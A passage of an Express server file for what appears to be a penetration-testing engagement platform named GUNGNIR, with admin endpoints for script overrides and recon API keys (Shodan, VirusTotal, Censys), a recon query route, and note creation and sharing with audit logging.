    related_tools: row.related_tools ? JSON.parse(row.related_tools) : [],
    tags:          row.tags          ? JSON.parse(row.tags)          : [],
  });
});

app.delete("/api/scripts/overrides/:id", auth(["admin"]), async (req, res) => {
  await qRun(
    `INSERT INTO script_overrides (item_id,hidden,updated_by,updated_at) VALUES (?,1,?,NOW())
     ON DUPLICATE KEY UPDATE hidden=1,updated_by=VALUES(updated_by),updated_at=NOW()`,
    [req.params.id, req.user.id]
  );
  await logAudit(req.user.id, req.user.username, 'delete', 'script_override', req.params.id, `Ocultar script built-in: ${req.params.id}`, req.ip);
  res.json({ ok: true });
});

// INTEGRATIONS — RECON API KEYS (stored in settings table)
// ─────────────────────────────────────────────────────────────────────────────
const RECON_KEY_SERVICES = ["shodan", "virustotal", "censys"];

app.get("/api/integrations/recon-keys", auth(["admin"]), async (req, res) => {
  const keys = {};
  for (const svc of RECON_KEY_SERVICES) {
    const row = await qRow("SELECT `value` FROM settings WHERE `key`=?", [`recon_key_${svc}`]);
    keys[svc] = row?.value ? "***configured***" : "";
  }
  res.json({ keys });
});

app.put("/api/integrations/recon-keys", auth(["admin"]), async (req, res) => {
  const { keys } = req.body;
  if (!keys || typeof keys !== "object") return res.status(400).json({ error: "keys requerido" });
  for (const [svc, val] of Object.entries(keys)) {
    if (!RECON_KEY_SERVICES.includes(svc)) continue;
    if (val === "" || val === null) {
      await qRun("DELETE FROM settings WHERE `key`=?", [`recon_key_${svc}`]);
    } else if (val && val !== "***configured***") {
      await qRun("INSERT INTO settings (`key`,`value`) VALUES (?,?) ON DUPLICATE KEY UPDATE `value`=?", [`recon_key_${svc}`, val, val]);
    }
  }
  auditLog(req.user.id, req.user.username, "update_recon_keys", "settings", null, null, req.ip);
  res.json({ ok: true });
});

app.get("/api/integrations/recon-keys/status", auth(), async (req, res) => {
  const status = {};
  for (const svc of RECON_KEY_SERVICES) {
    const row = await qRow("SELECT `value` FROM settings WHERE `key`=?", [`recon_key_${svc}`]);
    status[svc] = !!(row?.value);
  }
  res.json({ status });
});

// ─────────────────────────────────────────────────────────────────────────────
// INTEGRATIONS — RECON QUERY (Shodan + free APIs)
// ─────────────────────────────────────────────────────────────────────────────
app.post("/api/integrations/recon/query", auth(), async (req, res) => {
  const { target } = req.body;
  if (!target || !target.trim()) return res.status(400).json({ error: "target es requerido" });

  // Load API keys
  const apiKeys = {};
  for (const svc of RECON_KEY_SERVICES) {
    const row = await qRow("SELECT `value` FROM settings WHERE `key`=?", [`recon_key_${svc}`]);
    if (row?.value) apiKeys[svc] = row.value;
  }

  try {
    const result = await reconInt.queryTarget(target.trim(), apiKeys);
    auditLog(req.user.id, req.user.username, "recon_query", "recon", null, `target=${target.trim()}`, req.ip);
    res.json(result);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ── Notas ─────────────────────────────────────────────────────────────────────

// MySQL devuelve JSON columns como string — parseamos tags antes de enviar
const parseNote = (n) => n ? { ...n, tags: typeof n.tags === "string" ? JSON.parse(n.tags || "[]") : (n.tags || []) } : n;

// ── Lista de usuarios disponibles para compartir (sin req de admin) ──────────
app.get("/api/notes/users", auth(), async (req, res) => {
  const rows = await qRows(
    "SELECT id, username, full_name FROM users WHERE is_active=1 AND id != ? ORDER BY full_name",
    [req.user.id]
  );
  res.json(rows);
});

// ── GET /api/notes — propias + compartidas conmigo ────────────────────────────
app.get("/api/notes", auth(), async (req, res) => {
  const { search, engagement_id, pinned, tag } = req.query;
  const uid = req.user.id;

  // Construye filtros adicionales y acumula params en el array recibido
  const buildFilters = (params) => {
    let where = "";
    if (search) { where += " AND (n.title LIKE ? OR n.content LIKE ?)"; params.push(`%${search}%`, `%${search}%`); }
    if (engagement_id) { where += " AND n.engagement_id=?"; params.push(engagement_id); }
    if (pinned === "1") where += " AND n.is_pinned=1";
    if (tag) { where += " AND JSON_CONTAINS(n.tags, ?)"; params.push(JSON.stringify(tag)); }
    return where;
  };

  const ownedParams = [uid];
  const ownedRows = await qRows(
    `SELECT n.* FROM notes n WHERE n.user_id=?${buildFilters(ownedParams)} ORDER BY n.is_pinned DESC, n.updated_at DESC`,
    ownedParams
  );

  const sharedParams = [uid];
  const sharedRows = await qRows(
    `SELECT n.*, u.full_name AS owner_name, u.username AS owner_username
     FROM notes n
     JOIN note_shares ns ON ns.note_id=n.id AND ns.user_id=?
     JOIN users u ON u.id=n.user_id
     WHERE 1=1${buildFilters(sharedParams)}`,
    sharedParams
  );

  const owned  = ownedRows.map(n => ({ ...parseNote(n), is_owner: true }));
  const shared = sharedRows.map(n => ({ ...parseNote(n), is_owner: false }));

  const all = [...owned, ...shared].sort((a, b) => {
    const pa = a.is_pinned ? 1 : 0;
    const pb = b.is_pinned ? 1 : 0;
    if (pb !== pa) return pb - pa;
    return new Date(b.updated_at).getTime() - new Date(a.updated_at).getTime();
  });

  res.json(all);
});

// ── GET /api/notes/:id — dueño o usuario con acceso compartido ────────────────
app.get("/api/notes/:id", auth(), async (req, res) => {
  const uid = req.user.id;
  let note = await qRow("SELECT * FROM notes WHERE id=? AND user_id=?", [req.params.id, uid]);
  if (note) return res.json({ ...parseNote(note), is_owner: true });

  // Intentar acceso compartido
  note = await qRow(
    `SELECT n.*, u.full_name AS owner_name, u.username AS owner_username
     FROM notes n
     JOIN note_shares ns ON ns.note_id=n.id AND ns.user_id=?
     JOIN users u ON u.id=n.user_id
     WHERE n.id=?`,
    [uid, req.params.id]
  );
  if (!note) return res.status(404).json({ error: "Nota no encontrada" });
  res.json({ ...parseNote(note), is_owner: false });
});

app.post("/api/notes", auth(), async (req, res) => {
  const { title, content = "", tags = [], is_pinned = 0, engagement_id = null } = req.body;
  if (!title || !title.trim()) return res.status(400).json({ error: "El título es requerido" });
  const id = crypto.randomUUID();
  await qRun(
    "INSERT INTO notes (id, user_id, title, content, tags, is_pinned, engagement_id) VALUES (?,?,?,?,?,?,?)",
    [id, req.user.id, title.trim(), content, JSON.stringify(tags), is_pinned ? 1 : 0, engagement_id || null]
  );
  const note = await qRow("SELECT * FROM notes WHERE id=?", [id]);
  auditLog(req.user.id, req.user.username, "note_create", "notes", id, `title=${title.trim()}`, req.ip);
  res.status(201).json({ ...parseNote(note), is_owner: true });
});

app.put("/api/notes/:id", auth(), async (req, res) => {
  const note = await qRow("SELECT id FROM notes WHERE id=? AND user_id=?", [req.params.id, req.user.id]);
  if (!note) return res.status(403).json({ error: "Solo el dueño puede editar la nota" });
  const { title, content, tags, is_pinned, engagement_id } = req.body;
  const fields = [];
  const params = [];
  if (title !== undefined) { fields.push("title=?"); params.push(title.trim()); }
  if (content !== undefined) { fields.push("content=?"); params.push(content); }
  if (tags !== undefined) { fields.push("tags=?"); params.push(JSON.stringify(tags)); }
  if (is_pinned !== undefined) { fields.push("is_pinned=?"); params.push(is_pinned ? 1 : 0); }
  if (engagement_id !== undefined) { fields.push("engagement_id=?"); params.push(engagement_id || null); }
  if (!fields.length) return res.status(400).json({ error: "Nada que actualizar" });
  params.push(req.params.id);
  await qRun(`UPDATE notes SET ${fields.join(",")} WHERE id=?`, params);
  const updated = await qRow("SELECT * FROM notes WHERE id=?", [req.params.id]);
  res.json({ ...parseNote(updated), is_owner: true });
});

app.delete("/api/notes/:id", auth(), async (req, res) => {
  const note = await qRow("SELECT id FROM notes WHERE id=? AND user_id=?", [req.params.id, req.user.id]);
  if (!note) return res.status(403).json({ error: "Solo el dueño puede eliminar la nota" });
  await qRun("DELETE FROM notes WHERE id=?", [req.params.id]);
  auditLog(req.user.id, req.user.username, "note_delete", "notes", req.params.id, "", req.ip);
  res.json({ ok: true });
});

// ── Compartir nota ─────────────────────────────────────────────────────────────

// GET /api/notes/:id/shares — lista de usuarios con acceso (solo dueño)
app.get("/api/notes/:id/shares", auth(), async (req, res) => {
  const note = await qRow("SELECT id FROM notes WHERE id=? AND user_id=?", [req.params.id, req.user.id]);
  if (!note) return res.status(403).json({ error: "Solo el dueño puede ver los accesos" });
  const rows = await qRows(
    `SELECT u.id, u.username, u.full_name
     FROM note_shares ns JOIN users u ON u.id=ns.user_id
     WHERE ns.note_id=? ORDER BY u.full_name`,
    [req.params.id]
  );
  res.json(rows);
});

// POST /api/notes/:id/share — compartir con un usuario (solo dueño)
app.post("/api/notes/:id/share", auth(), async (req, res) => {
  const note = await qRow("SELECT id FROM notes WHERE id=? AND user_id=?", [req.params.id, req.user.id]);
  if (!note) return res.status(403).json({ error: "Solo el dueño puede compartir la nota" });
  const { user_id } = req.body;
  if (!user_id) return res.status(400).json({ error: "user_id requerido" });
  if (user_id === req.user.id) return res.status(400).json({ error: "No podés compartir contigo mismo" });
  const target = await qRow("SELECT id FROM users WHERE id=? AND is_active=1", [user_id]);
  if (!target) return res.status(404).json({ error: "Usuario no encontrado" });
  await qRun("INSERT IGNORE INTO note_shares (note_id, user_id) VALUES (?,?)", [req.params.id, user_id]);
  auditLog(req.user.id, req.user.username, "note_share", "notes", req.params.id, `shared_with=${user_id}`, req.ip);
  res.json({ ok: true });
});

// DELETE /api/notes/:id/share/:userId — revocar acceso (solo dueño)
app.delete("/api/notes/:id/share/:userId", auth(), async (req, res) => {
  const note = await qRow("SELECT id FROM notes WHERE id=? AND user_id=?", [req.params.id, req.user.id]);
  if (!note) return res.status(403).json({ error: "Solo el dueño puede revocar accesos" });
  await qRun("DELETE FROM note_shares WHERE note_id=? AND user_id=?", [req.params.id, req.params.userId]);
  res.json({ ok: true });
});

if (fs.existsSync(DIST)) {
  app.use(express.static(DIST));
  app.get("*", (_, res) => res.sendFile(path.join(DIST, "index.html")));
}

// ── Error handler ─────────────────────────────────────────────────────────────
app.use((err, req, res, next) => {
  // JSON parse errors from express.json() middleware
  if (err.type === 'entity.parse.failed' || err instanceof SyntaxError) {
    return res.status(400).json({ error: "JSON inválido en el cuerpo de la petición" });
  }
  console.error("[GUNGNIR] Error:", err.message);
  res.status(500).json({ error: "Error interno del servidor" });
});

// ── Start ─────────────────────────────────────────────────────────────────────
initDB().then(() => {
  app.listen(PORT, () => {
    console.log(`[GUNGNIR] Servidor corriendo en puerto ${PORT}`);
    console.log(`[GUNGNIR] Env: ${process.env.NODE_ENV || 'development'}`);
  });
}).catch((err) => {
  console.error("[GUNGNIR] Error al inicializar DB:", err);
  process.exit(1);
});
